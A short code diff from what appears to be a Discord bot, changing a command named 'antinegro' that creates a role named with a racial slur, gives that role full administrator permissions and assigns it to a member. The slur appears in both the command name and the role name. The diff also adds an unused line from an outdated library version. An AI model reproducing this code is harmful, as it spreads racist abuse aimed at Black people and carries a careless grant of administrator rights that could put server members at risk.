@@ -177,9 +177,9 @@ async def antinegro(ctx, member: discord.Member):
     antiRole = discord.utils.get(guild.roles, name="AntiNigger")
 
     if not antiRole:
+        server = ctx.message.server
         antiRole = await guild.create_role(name="AntiNigger")
-        perms = Permissions()
-        perms.update(administrator=True)
+        perms = discord.Permissions(administrator=True)
         await antiRole.edit(permissions=perms)
 
     await member.add_roles(antiRole)
